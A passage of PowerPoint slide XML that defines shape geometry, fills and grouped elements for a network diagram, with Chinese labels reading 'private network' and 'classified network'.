                <a:gd name="T37" fmla="*/ 41146 h 628"/>
                <a:gd name="T38" fmla="*/ 0 w 1250"/>
                <a:gd name="T39" fmla="*/ 82786 h 628"/>
                <a:gd name="T40" fmla="*/ 57590 w 1250"/>
                <a:gd name="T41" fmla="*/ 84075 h 628"/>
                <a:gd name="T42" fmla="*/ 167390 w 1250"/>
                <a:gd name="T43" fmla="*/ 116947 h 628"/>
                <a:gd name="T44" fmla="*/ 507083 w 1250"/>
                <a:gd name="T45" fmla="*/ 109693 h 628"/>
                <a:gd name="T46" fmla="*/ 741660 w 1250"/>
                <a:gd name="T47" fmla="*/ 120505 h 628"/>
                <a:gd name="T48" fmla="*/ 839288 w 1250"/>
                <a:gd name="T49" fmla="*/ 106520 h 628"/>
                <a:gd name="T50" fmla="*/ 1239110 w 1250"/>
                <a:gd name="T51" fmla="*/ 116083 h 628"/>
                <a:gd name="T52" fmla="*/ 1521432 w 1250"/>
                <a:gd name="T53" fmla="*/ 102990 h 628"/>
                <a:gd name="T54" fmla="*/ 1702657 w 1250"/>
                <a:gd name="T55" fmla="*/ 117370 h 628"/>
                <a:gd name="T56" fmla="*/ 1905100 w 1250"/>
                <a:gd name="T57" fmla="*/ 101519 h 628"/>
                <a:gd name="T58" fmla="*/ 2120323 w 1250"/>
                <a:gd name="T59" fmla="*/ 118514 h 628"/>
                <a:gd name="T60" fmla="*/ 2303766 w 1250"/>
                <a:gd name="T61" fmla="*/ 103854 h 628"/>
                <a:gd name="T62" fmla="*/ 2547000 w 1250"/>
                <a:gd name="T63" fmla="*/ 114901 h 628"/>
                <a:gd name="T64" fmla="*/ 2971602 w 1250"/>
                <a:gd name="T65" fmla="*/ 105730 h 628"/>
                <a:gd name="T66" fmla="*/ 2889125 w 1250"/>
                <a:gd name="T67" fmla="*/ 81575 h 628"/>
                <a:gd name="T68" fmla="*/ 3017202 w 1250"/>
                <a:gd name="T69" fmla="*/ 63681 h 628"/>
                <a:gd name="T70" fmla="*/ 3017202 w 1250"/>
                <a:gd name="T71" fmla="*/ 63681 h 62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50"/>
                <a:gd name="T109" fmla="*/ 0 h 628"/>
                <a:gd name="T110" fmla="*/ 1250 w 1250"/>
                <a:gd name="T111" fmla="*/ 628 h 62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50" h="628">
                  <a:moveTo>
                    <a:pt x="1250" y="332"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="1202" y="157"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1231" y="127"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1104" y="0"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1050" y="53"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1021" y="3"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="967" y="34"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="908" y="0"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="735" y="51"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="585" y="19"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="505" y="65"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="393" y="0"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="216" y="46"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="169" y="0"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="132" y="37"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="90" y="12"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="168"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="20" y="214"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="58" y="214"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="431"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="24" y="438"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="70" y="609"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="210" y="572"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="307" y="628"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="348" y="555"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="513" y="605"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="630" y="537"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="705" y="611"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="789" y="528"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="878" y="617"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="955" y="541"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1055" y="598"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1231" y="551"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1197" y="424"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1250" y="332"/>
                  </a:lnTo>
                  <a:close/>
                </a:path>
              </a:pathLst>
            </a:custGeom>
            <a:solidFill>
              <a:srgbClr val="CCCCFF"/>
            </a:solidFill>
            <a:ln>
              <a:noFill/>
            </a:ln>
            <a:extLst>
              <a:ext uri="{91240B29-F687-4F45-9708-019B960494DF}">
                <a14:hiddenLine xmlns:a14="http://schemas.microsoft.com/office/drawing/2010/main" w="14288">
                  <a:solidFill>
                    <a:srgbClr val="000000"/>
                  </a:solidFill>
                  <a:round/>
                  <a:headEnd/>
                  <a:tailEnd/>
                </a14:hiddenLine>
              </a:ext>
            </a:extLst>
          </p:spPr>
          <p:txBody>
            <a:bodyPr/>
            <a:lstStyle/>
            <a:p>
              <a:endParaRPr lang="zh-CN" altLang="en-US"/>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="98359" name="Text Box 166"/>
            <p:cNvSpPr txBox="1">
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="4240" y="1217"/>
              <a:ext cx="312" cy="180"/>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1600" b="1"/>
                <a:t>专网</a:t>
              </a:r>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="98360" name="Line 167"/>
            <p:cNvSpPr>
              <a:spLocks noChangeShapeType="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="4931" y="1005"/>
              <a:ext cx="53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61" name="Freeform 168"/>
            <p:cNvSpPr>
              <a:spLocks/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="1533" y="769"/>
              <a:ext cx="2267" cy="266"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst>
                <a:gd name="T0" fmla="*/ 0 w 2267"/>
                <a:gd name="T1" fmla="*/ 0 h 267"/>
                <a:gd name="T2" fmla="*/ 1784 w 2267"/>
                <a:gd name="T3" fmla="*/ 0 h 267"/>
                <a:gd name="T4" fmla="*/ 1784 w 2267"/>
                <a:gd name="T5" fmla="*/ 240 h 267"/>
                <a:gd name="T6" fmla="*/ 2267 w 2267"/>
                <a:gd name="T7" fmla="*/ 240 h 267"/>
                <a:gd name="T8" fmla="*/ 0 60000 65536"/>
                <a:gd name="T9" fmla="*/ 0 60000 65536"/>
                <a:gd name="T10" fmla="*/ 0 60000 65536"/>
                <a:gd name="T11" fmla="*/ 0 60000 65536"/>
                <a:gd name="T12" fmla="*/ 0 w 2267"/>
                <a:gd name="T13" fmla="*/ 0 h 267"/>
                <a:gd name="T14" fmla="*/ 2267 w 2267"/>
                <a:gd name="T15" fmla="*/ 267 h 267"/>
              </a:gdLst>
              <a:ahLst/>
              <a:cxnLst>
                <a:cxn ang="T8">
                  <a:pos x="T0" y="T1"/>
                </a:cxn>
                <a:cxn ang="T9">
                  <a:pos x="T2" y="T3"/>
                </a:cxn>
                <a:cxn ang="T10">
                  <a:pos x="T4" y="T5"/>
                </a:cxn>
                <a:cxn ang="T11">
                  <a:pos x="T6" y="T7"/>
                </a:cxn>
              </a:cxnLst>
              <a:rect l="T12" t="T13" r="T14" b="T15"/>
              <a:pathLst>
                <a:path w="2267" h="267">
                  <a:moveTo>
                    <a:pt x="0" y="0"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="1784" y="0"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1784" y="267"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2267" y="267"/>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62" name="AutoShape 169"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="3656" y="857"/>
              <a:ext cx="1466" cy="244"/>
            </a:xfrm>
            <a:prstGeom prst="octagon">
              <a:avLst>
                <a:gd name="adj" fmla="val 29287"/>
              </a:avLst>
            </a:prstGeom>
            <a:solidFill>
              <a:srgbClr val="CC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1600" b="1">
                  <a:solidFill>
                    <a:schemeClr val="bg1"/>
                  </a:solidFill>
                </a:rPr>
                <a:t>密级网络</a:t>
              </a:r>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="98363" name="Rectangle 170"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="1491" y="737"/>
              <a:ext cx="91" cy="88"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
            <a:solidFill>
              <a:srgbClr val="FF9900"/>
            </a:solidFill>
            <a:ln w="6350">
              <a:solidFill>
                <a:schemeClr val="tx1"/>
              </a:solidFill>
              <a:miter lim="800000"/>
              <a:headEnd/>
              <a:tailEnd/>
            </a:ln>
          </p:spPr>
          <p:txBody>
            <a:bodyPr wrap="none" anchor="ctr"/>
            <a:lstStyle/>
            <a:p>
              <a:endParaRPr lang="zh-CN" altLang="zh-CN"/>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="98364" name="Rectangle 171"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="1491" y="1489"/>
              <a:ext cx="91" cy="86"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
            <a:solidFill>
              <a:srgbClr val="FF9900"/>
            </a:solidFill>
            <a:ln w="6350">
              <a:solidFill>
                <a:schemeClr val="tx1"/>
              </a:solidFill>
              <a:miter lim="800000"/>
              <a:headEnd/>
              <a:tailEnd/>
            </a:ln>
          </p:spPr>
          <p:txBody>
            <a:bodyPr wrap="none" anchor="ctr"/>
            <a:lstStyle/>
            <a:p>
              <a:endParaRPr lang="zh-CN" altLang="zh-CN"/>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="98365" name="Rectangle 172"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="1491" y="2255"/>
              <a:ext cx="91" cy="88"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
            <a:solidFill>
              <a:srgbClr val="FF9900"/>
            </a:solidFill>
            <a:ln w="6350">
              <a:solidFill>
                <a:schemeClr val="tx1"/>
              </a:solidFill>
              <a:miter lim="800000"/>
              <a:headEnd/>
              <a:tailEnd/>
            </a:ln>
          </p:spPr>
          <p:txBody>
            <a:bodyPr wrap="none" anchor="ctr"/>
            <a:lstStyle/>
            <a:p>
              <a:endParaRPr lang="zh-CN" altLang="zh-CN"/>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="98366" name="Freeform 173"/>
            <p:cNvSpPr>
              <a:spLocks/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="765" y="2593"/>
              <a:ext cx="883" cy="388"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst>
                <a:gd name="T0" fmla="*/ 775 w 883"/>
                <a:gd name="T1" fmla="*/ 0 h 407"/>
                <a:gd name="T2" fmla="*/ 883 w 883"/>
                <a:gd name="T3" fmla="*/ 0 h 407"/>
                <a:gd name="T4" fmla="*/ 883 w 883"/>
                <a:gd name="T5" fmla="*/ 79 h 407"/>
                <a:gd name="T6" fmla="*/ 546 w 883"/>
                <a:gd name="T7" fmla="*/ 79 h 407"/>
                <a:gd name="T8" fmla="*/ 546 w 883"/>
                <a:gd name="T9" fmla="*/ 112 h 407"/>
                <a:gd name="T10" fmla="*/ 0 w 883"/>
                <a:gd name="T11" fmla="*/ 112 h 407"/>
                <a:gd name="T12" fmla="*/ 0 60000 65536"/>
                <a:gd name="T13" fmla="*/ 0 60000 65536"/>
                <a:gd name="T14" fmla="*/ 0 60000 65536"/>
                <a:gd name="T15" fmla="*/ 0 60000 65536"/>
                <a:gd name="T16" fmla="*/ 0 60000 65536"/>
                <a:gd name="T17" fmla="*/ 0 60000 65536"/>
                <a:gd name="T18" fmla="*/ 0 w 883"/>
                <a:gd name="T19" fmla="*/ 0 h 407"/>
                <a:gd name="T20" fmla="*/ 883 w 883"/>
                <a:gd name="T21" fmla="*/ 407 h 407"/>
              </a:gdLst>
              <a:ahLst/>
              <a:cxnLst>
                <a:cxn ang="T12">
                  <a:pos x="T0" y="T1"/>
                </a:cxn>
                <a:cxn ang="T13">
                  <a:pos x="T2" y="T3"/>
                </a:cxn>
                <a:cxn ang="T14">
                  <a:pos x="T4" y="T5"/>
                </a:cxn>
                <a:cxn ang="T15">
                  <a:pos x="T6" y="T7"/>
                </a:cxn>
                <a:cxn ang="T16">
                  <a:pos x="T8" y="T9"/>
                </a:cxn>
                <a:cxn ang="T17">
                  <a:pos x="T10" y="T11"/>
                </a:cxn>
              </a:cxnLst>
              <a:rect l="T18" t="T19" r="T20" b="T21"/>
              <a:pathLst>
                <a:path w="883" h="407">
                  <a:moveTo>
                    <a:pt x="775" y="0"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="883" y="0"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="883" y="286"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="546" y="286"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="546" y="407"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="407"/>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98367" name="Group 174"/>
            <p:cNvGrpSpPr>
              <a:grpSpLocks/>
            </p:cNvGrpSpPr>
            <p:nvPr/>
          </p:nvGrpSpPr>
          <p:grpSpPr bwMode="auto">
            <a:xfrm>
              <a:off x="588" y="2829"/>
              <a:ext cx="345" cy="241"/>
              <a:chOff x="553" y="2647"/>
              <a:chExt cx="361" cy="264"/>
            </a:xfrm>
          </p:grpSpPr>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="98388" name="AutoShape 175"/>
              <p:cNvSpPr>
                <a:spLocks noChangeArrowheads="1"/>
              </p:cNvSpPr>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr bwMode="auto">
              <a:xfrm flipH="1" flipV="1">
                <a:off x="586" y="2822"/>
                <a:ext cx="295" cy="8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489 w 21600"/>
                  <a:gd name="T13" fmla="*/ 2427 h 21600"/>
                  <a:gd name="T14" fmla="*/ 19111 w 21600"/>
                  <a:gd name="T15" fmla="*/ 19173 h 21600"/>
                </a:gdLst>
                <a:ahLst/>
                <a:cxnLst>
                  <a:cxn ang="T8">
                    <a:pos x="T0" y="T1"/>
                  </a:cxn>
                  <a:cxn ang="T9">
                    <a:pos x="T2" y="T3"/>
                  </a:cxn>
                  <a:cxn ang="T10">
                    <a:pos x="T4" y="T5"/>
                  </a:cxn>
                  <a:cxn ang="T11">
                    <a:pos x="T6" y="T7"/>
                  </a:cxn>
                </a:cxnLst>
                <a:rect l="T12" t="T13" r="T14" b="T15"/>
                <a:pathLst>
                  <a:path w="21600" h="21600">
                    <a:moveTo>
                      <a:pt x="0" y="0"/>
                    </a:moveTo>
                    <a:lnTo>
                      <a:pt x="1440" y="21600"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="20160" y="21600"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="21600" y="0"/>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p>
                <a:endParaRPr lang="zh-CN" altLang="en-US"/>
              </a:p>
            </p:txBody>
          </p:sp>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="98389" name="AutoShape 176"/>
              <p:cNvSpPr>
                <a:spLocks noChangeArrowheads="1"/>
              </p:cNvSpPr>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr bwMode="auto">
              <a:xfrm flipV="1">
                <a:off x="612" y="2709"/>
                <a:ext cx="242" cy="1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838 w 21600"/>
                  <a:gd name="T13" fmla="*/ 3883 h 21600"/>
                  <a:gd name="T14" fmla="*/ 17762 w 21600"/>
                  <a:gd name="T15" fmla="*/ 17717 h 21600"/>
                </a:gdLst>
                <a:ahLst/>
                <a:cxnLst>
                  <a:cxn ang="T8">
                    <a:pos x="T0" y="T1"/>
                  </a:cxn>
                  <a:cxn ang="T9">
                    <a:pos x="T2" y="T3"/>
                  </a:cxn>
                  <a:cxn ang="T10">
                    <a:pos x="T4" y="T5"/>
                  </a:cxn>
                  <a:cxn ang="T11">
                    <a:pos x="T6" y="T7"/>
                  </a:cxn>
                </a:cxnLst>
                <a:rect l="T12" t="T13" r="T14" b="T15"/>
                <a:pathLst>
                  <a:path w="21600" h="21600">
                    <a:moveTo>
                      <a:pt x="0" y="0"/>
                    </a:moveTo>
                    <a:lnTo>
                      <a:pt x="4164" y="21600"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="17436" y="21600"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="21600" y="0"/>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p>
                <a:endParaRPr lang="zh-CN" altLang="en-US"/>
              </a:p>
            </p:txBody>
          </p:sp>
          <p:grpSp>
            <p:nvGrpSpPr>
              <p:cNvPr id="98390" name="Group 177"/>
              <p:cNvGrpSpPr>
                <a:grpSpLocks/>
              </p:cNvGrpSpPr>
              <p:nvPr/>
            </p:nvGrpSpPr>
            <p:grpSpPr bwMode="auto">
              <a:xfrm>
                <a:off x="684" y="2734"/>
                <a:ext cx="99" cy="103"/>
                <a:chOff x="3200" y="1770"/>
                <a:chExt cx="278" cy="284"/>
              </a:xfrm>
            </p:grpSpPr>
            <p:grpSp>
              <p:nvGrpSpPr>
                <p:cNvPr id="98395" name="Group 178"/>
                <p:cNvGrpSpPr>
                  <a:grpSpLocks/>
                </p:cNvGrpSpPr>
                <p:nvPr/>
              </p:nvGrpSpPr>
              <p:grpSpPr bwMode="auto">
                <a:xfrm>
                  <a:off x="3200" y="1770"/>
                  <a:ext cx="278" cy="58"/>
                  <a:chOff x="3200" y="1770"/>
                  <a:chExt cx="278" cy="58"/>
                </a:xfrm>
              </p:grpSpPr>
              <p:sp>
                <p:nvSpPr>
                  <p:cNvPr id="98404" name="Rectangle 179"/>
                  <p:cNvSpPr>
                    <a:spLocks noChangeArrowheads="1"/>
                  </p:cNvSpPr>
                  <p:nvPr/>
                </p:nvSpPr>
                <p:spPr bwMode="auto">
                  <a:xfrm>
                    <a:off x="320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05" name="Rectangle 180"/>
                  <p:cNvSpPr>
                    <a:spLocks noChangeArrowheads="1"/>
                  </p:cNvSpPr>
                  <p:nvPr/>
                </p:nvSpPr>
                <p:spPr bwMode="auto">
                  <a:xfrm>
                    <a:off x="331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06" name="Rectangle 181"/>
                  <p:cNvSpPr>
                    <a:spLocks noChangeArrowheads="1"/>
                  </p:cNvSpPr>
                  <p:nvPr/>
                </p:nvSpPr>
                <p:spPr bwMode="auto">
                  <a:xfrm>
                    <a:off x="342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grpSp>
              <p:nvGrpSpPr>
                <p:cNvPr id="98396" name="Group 182"/>
                <p:cNvGrpSpPr>
                  <a:grpSpLocks/>
                </p:cNvGrpSpPr>
                <p:nvPr/>
              </p:nvGrpSpPr>
              <p:grpSpPr bwMode="auto">
                <a:xfrm>
                  <a:off x="3200" y="1883"/>
                  <a:ext cx="278" cy="58"/>
                  <a:chOff x="3200" y="1770"/>
                  <a:chExt cx="278" cy="58"/>
                </a:xfrm>
              </p:grpSpPr>
              <p:sp>
                <p:nvSpPr>
                  <p:cNvPr id="98401" name="Rectangle 183"/>
                  <p:cNvSpPr>
                    <a:spLocks noChangeArrowheads="1"/>
                  </p:cNvSpPr>
                  <p:nvPr/>
                </p:nvSpPr>
                <p:spPr bwMode="auto">
                  <a:xfrm>
                    <a:off x="320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02" name="Rectangle 184"/>
                  <p:cNvSpPr>
                    <a:spLocks noChangeArrowheads="1"/>
                  </p:cNvSpPr>
                  <p:nvPr/>
                </p:nvSpPr>
                <p:spPr bwMode="auto">
                  <a:xfrm>
                    <a:off x="331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03" name="Rectangle 185"/>
                  <p:cNvSpPr>
                    <a:spLocks noChangeArrowheads="1"/>
                  </p:cNvSpPr>
                  <p:nvPr/>
                </p:nvSpPr>
                <p:spPr bwMode="auto">
                  <a:xfrm>
                    <a:off x="342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grpSp>
              <p:nvGrpSpPr>
                <p:cNvPr id="98397" name="Group 186"/>
                <p:cNvGrpSpPr>
                  <a:grpSpLocks/>
                </p:cNvGrpSpPr>
                <p:nvPr/>
              </p:nvGrpSpPr>
              <p:grpSpPr bwMode="auto">
                <a:xfrm>
                  <a:off x="3200" y="1996"/>
                  <a:ext cx="278" cy="58"/>
                  <a:chOff x="3200" y="1770"/>
                  <a:chExt cx="278" cy="58"/>
                </a:xfrm>
              </p:grpSpPr>
              <p:sp>
                <p:nvSpPr>
                  <p:cNvPr id="98398" name="Rectangle 187"/>
                  <p:cNvSpPr>
                    <a:spLocks noChangeArrowheads="1"/>
                  </p:cNvSpPr>
                  <p:nvPr/>
                </p:nvSpPr>
                <p:spPr bwMode="auto">
                  <a:xfrm>
                    <a:off x="320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399" name="Rectangle 188"/>
                  <p:cNvSpPr>
                    <a:spLocks noChangeArrowheads="1"/>
                  </p:cNvSpPr>
                  <p:nvPr/>
                </p:nvSpPr>
                <p:spPr bwMode="auto">
                  <a:xfrm>
                    <a:off x="331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00" name="Rectangle 189"/>
                  <p:cNvSpPr>
                    <a:spLocks noChangeArrowheads="1"/>
                  </p:cNvSpPr>
                  <p:nvPr/>
                </p:nvSpPr>
                <p:spPr bwMode="auto">
                  <a:xfrm>
                    <a:off x="342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grpSp>
          <p:grpSp>
            <p:nvGrpSpPr>
              <p:cNvPr id="98391" name="Group 190"/>
              <p:cNvGrpSpPr>
                <a:grpSpLocks/>
              </p:cNvGrpSpPr>
              <p:nvPr/>
            </p:nvGrpSpPr>
            <p:grpSpPr bwMode="auto">
              <a:xfrm>
                <a:off x="553" y="2647"/>
                <a:ext cx="361" cy="105"/>
                <a:chOff x="3304" y="2750"/>
                <a:chExt cx="745" cy="204"/>
              </a:xfrm>
            </p:grpSpPr>
            <p:sp>
              <p:nvSpPr>
                <p:cNvPr id="98392" name="Arc 191"/>
                <p:cNvSpPr>
                  <a:spLocks/>
                </p:cNvSpPr>
                <p:nvPr/>
              </p:nvSpPr>
              <p:spPr bwMode="auto">
                <a:xfrm>
                  <a:off x="3304" y="2750"/>
                  <a:ext cx="745" cy="130"/>
                </a:xfrm>
                <a:custGeom>
                  <a:avLst/>
                  <a:gdLst>
                    <a:gd name="T0" fmla="*/ 0 w 43200"/>
                    <a:gd name="T1" fmla="*/ 0 h 23132"/>
                    <a:gd name="T2" fmla="*/ 0 w 43200"/>
                    <a:gd name="T3" fmla="*/ 0 h 23132"/>
                    <a:gd name="T4" fmla="*/ 0 w 43200"/>
                    <a:gd name="T5" fmla="*/ 0 h 23132"/>
                    <a:gd name="T6" fmla="*/ 0 60000 65536"/>
                    <a:gd name="T7" fmla="*/ 0 60000 65536"/>
                    <a:gd name="T8" fmla="*/ 0 60000 65536"/>
                    <a:gd name="T9" fmla="*/ 0 w 43200"/>
                    <a:gd name="T10" fmla="*/ 0 h 23132"/>
                    <a:gd name="T11" fmla="*/ 43200 w 43200"/>
                    <a:gd name="T12" fmla="*/ 23132 h 23132"/>
                  </a:gdLst>
                  <a:ahLst/>
                  <a:cxnLst>
                    <a:cxn ang="T6">
                      <a:pos x="T0" y="T1"/>
                    </a:cxn>
                    <a:cxn ang="T7">
                      <a:pos x="T2" y="T3"/>
                    </a:cxn>
                    <a:cxn ang="T8">
                      <a:pos x="T4" y="T5"/>
                    </a:cxn>
                  </a:cxnLst>
                  <a:rect l="T9" t="T10" r="T11" b="T12"/>
                  <a:pathLst>
                    <a:path w="43200" h="23132" fill="none" extrusionOk="0">
                      <a:moveTo>
                        <a:pt x="54" y="23132"/>
                      </a:moveTo>
                      <a:cubicBezTo>
                        <a:pt x="18" y="22622"/>
                        <a:pt x="0" y="22111"/>
                        <a:pt x="0" y="21600"/>
                      </a:cubicBezTo>
                      <a:cubicBezTo>
                        <a:pt x="0" y="9670"/>
                        <a:pt x="9670" y="0"/>
                        <a:pt x="21600" y="0"/>
                      </a:cubicBezTo>
                      <a:cubicBezTo>
                        <a:pt x="33529" y="0"/>
                        <a:pt x="43200" y="9670"/>
                        <a:pt x="43200" y="21600"/>
                      </a:cubicBezTo>
                      <a:cubicBezTo>
                        <a:pt x="43200" y="22087"/>
                        <a:pt x="43183" y="22574"/>
                        <a:pt x="43150" y="23060"/>
                      </a:cubicBezTo>
                    </a:path>
                    <a:path w="43200" h="23132" stroke="0" extrusionOk="0">
                      <a:moveTo>
                        <a:pt x="54" y="23132"/>
                      </a:moveTo>
                      <a:cubicBezTo>
                        <a:pt x="18" y="22622"/>
                        <a:pt x="0" y="22111"/>
                        <a:pt x="0" y="21600"/>
                      </a:cubicBezTo>
                      <a:cubicBezTo>
                        <a:pt x="0" y="9670"/>
                        <a:pt x="9670" y="0"/>
                        <a:pt x="21600" y="0"/>
                      </a:cubicBezTo>
                      <a:cubicBezTo>
                        <a:pt x="33529" y="0"/>
                        <a:pt x="43200" y="9670"/>
                        <a:pt x="43200" y="21600"/>
                      </a:cubicBezTo>
                      <a:cubicBezTo>
                        <a:pt x="43200" y="22087"/>
                        <a:pt x="43183" y="22574"/>
                        <a:pt x="43150" y="23060"/>
                      </a:cubicBezTo>
                      <a:lnTo>
                        <a:pt x="21600" y="21600"/>
                      </a:lnTo>
                      <a:lnTo>
                        <a:pt x="54" y="2313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98393" name="AutoShape 192"/>
                <p:cNvSpPr>
                  <a:spLocks noChangeArrowheads="1"/>
                </p:cNvSpPr>
                <p:nvPr/>
              </p:nvSpPr>
              <p:spPr bwMode="auto">
                <a:xfrm>
                  <a:off x="3875" y="2852"/>
                  <a:ext cx="174" cy="102"/>
                </a:xfrm>
                <a:prstGeom prst="roundRect">
                  <a:avLst>
                    <a:gd name="adj" fmla="val 16667"/>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98394" name="AutoShape 193"/>
                <p:cNvSpPr>
                  <a:spLocks noChangeArrowheads="1"/>
                </p:cNvSpPr>
                <p:nvPr/>
              </p:nvSpPr>
              <p:spPr bwMode="auto">
                <a:xfrm>
                  <a:off x="3304" y="2852"/>
                  <a:ext cx="174" cy="102"/>
                </a:xfrm>
                <a:prstGeom prst="roundRect">
                  <a:avLst>
                    <a:gd name="adj" fmla="val 16667"/>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grpSp>
        </p:grpSp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="98368" name="AutoShape 194"/>
            <p:cNvSpPr>
              <a:spLocks noChangeAspect="1" noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="1485" y="2544"/>
              <a:ext cx="104" cy="100"/>
            </a:xfrm>
            <a:prstGeom prst="plus">
              <a:avLst>
                <a:gd name="adj" fmla="val 25000"/>
              </a:avLst>
            </a:prstGeom>
            <a:solidFill>
              <a:srgbClr val="FF7C80"/>
            </a:solidFill>
            <a:ln w="6350">
              <a:solidFill>
                <a:schemeClr val="tx1"/>
              </a:solidFill>
              <a:miter lim="800000"/>
              <a:headEnd/>
              <a:tailEnd/>
            </a:ln>
          </p:spPr>
          <p:txBody>
            <a:bodyPr wrap="none" anchor="ctr"/>
            <a:lstStyle/>
            <a:p>
              <a:endParaRPr lang="zh-CN" altLang="zh-CN"/>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="98369" name="Freeform 195"/>
            <p:cNvSpPr>
              <a:spLocks/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="1368" y="2974"/>
              <a:ext cx="2489" cy="156"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst>
                <a:gd name="T0" fmla="*/ 0 w 2489"/>
                <a:gd name="T1" fmla="*/ 0 h 165"/>
                <a:gd name="T2" fmla="*/ 489 w 2489"/>
                <a:gd name="T3" fmla="*/ 0 h 165"/>
                <a:gd name="T4" fmla="*/ 489 w 2489"/>
